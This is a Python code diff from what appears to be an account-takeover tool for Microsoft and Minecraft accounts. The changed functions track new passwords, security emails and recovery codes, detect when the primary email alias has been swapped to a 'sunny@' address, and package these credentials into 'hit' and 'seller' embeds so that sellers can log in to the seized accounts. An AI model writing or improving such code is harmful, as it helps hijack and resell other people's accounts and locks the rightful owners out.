@@ -19,29 +19,53 @@ def _reject_failure(email: str, reason: str, account: dict, *, credentials_chang
     mc = (account or {}).get("minecraft") or {}
     # Give-back failures must include the current primary when alias was replaced
     # (old email may already be deleted). Success seller embeds still hide sunny.
+    sec = str(ms.get("security_email") or "").strip()
+    pwd = str(ms.get("password") or "").strip()
+    rec = str(ms.get("recovery_code") or "").strip()
+    original = str(ms.get("original_email") or email or "").strip() or email
+    primary = str(ms.get("email") or "").strip() or original
+    replaced = ms.get("primary_alias_replaced")
+    if replaced is None and primary.lower() != original.lower():
+        replaced = True
+    has_creds = bool(
+        (sec and sec not in {"Couldn't Change!", "Unknown", "N/A", "?"})
+        or (pwd and pwd not in {"Couldn't Change!", "Unknown", "N/A", "?"})
+        or (rec and rec not in {"Couldn't Change!", "Unknown", "N/A", "?", "Failed to generate"})
+        or replaced is True
+    )
+    # Recover / primary replace already changed login secrets — return them on reject
+    # (primary-alias fail, UNVERIFIED, bans, filters, RecoverUser parse fail, etc.).
+    if has_creds:
+        credentials_changed = True
+
+    # Prefer recover_error detail when RecoverUser blew up after sunny promote
+    detail = str(ms.get("recover_error") or reason or "").strip() or reason
+
     ms_for_embed = {
-        "email": ms.get("email") or email,
-        "original_email": ms.get("original_email") or email,
-        "security_email": ms.get("security_email") or "Couldn't Change!",
-        "password": ms.get("password") or "Couldn't Change!",
-        "recovery_code": ms.get("recovery_code") or "Couldn't Change!",
+        "email": primary,
+        "original_email": original,
+        "security_email": sec or "Couldn't Change!",
+        "password": pwd or "Couldn't Change!",
+        "recovery_code": rec or "Couldn't Change!",
         "username": mc.get("name"),
+        "primary_alias_replaced": replaced,
     }
     fail_embed = build_failure_embed(
-        email,
+        original,
         ms_for_embed,
         reason,
-        error=reason,
+        error=detail,
         credentials_changed=credentials_changed,
     )
     return {
         "failed": True,
         "reason": reason,
-        "microsoft": ms,
+        "error": detail,
+        "microsoft": {**ms, **ms_for_embed},
         "minecraft": mc,
         "credentials_changed": credentials_changed,
         "hit_embed": fail_embed,
-        # Same embed for sellers on reject — they need the new primary to log in
+        # Same embed for sellers on reject — they need the new creds to log in
         "seller_embed": fail_embed,
     }
 
@@ -135,8 +159,25 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
                 if not isinstance(account, dict):
                     raise
                 account.setdefault("microsoft", {})
-                # Fall through to persist + embed with partial data
-                pass
+                ms = account["microsoft"]
+                if not ms.get("recover_error"):
+                    ms["recover_error"] = f"{exc.__class__.__name__}: {exc}"
+                # Primary may already be sunny@ — never fall through as a "success"
+                # with an incomplete secure; give sellers the current primary back.
+                creds_changed = bool(rextra) or (
+                    ms.get("primary_alias_replaced") is True
+                    or (
+                        str(ms.get("password") or "")
+                        not in ("", "Couldn't Change!", "Unknown")
+                        and "UNVERIFIED" not in str(ms.get("password") or "")
+                    )
+                )
+                return _reject_failure(
+                    email,
+                    f"Securing step failed: {exc}",
+                    account,
+                    credentials_changed=creds_changed,
+                )
 
     creds_changed = bool(rextra) or (
         str((account.get("microsoft") or {}).get("password") or "")
@@ -145,6 +186,8 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
     )
     # After recover/secure, password is almost always changed when rextra is present
     if rextra:
+        creds_changed = True
+    if (account.get("microsoft") or {}).get("primary_alias_replaced") is True:
         creds_changed = True
 
     reject = rejection_reason(account)
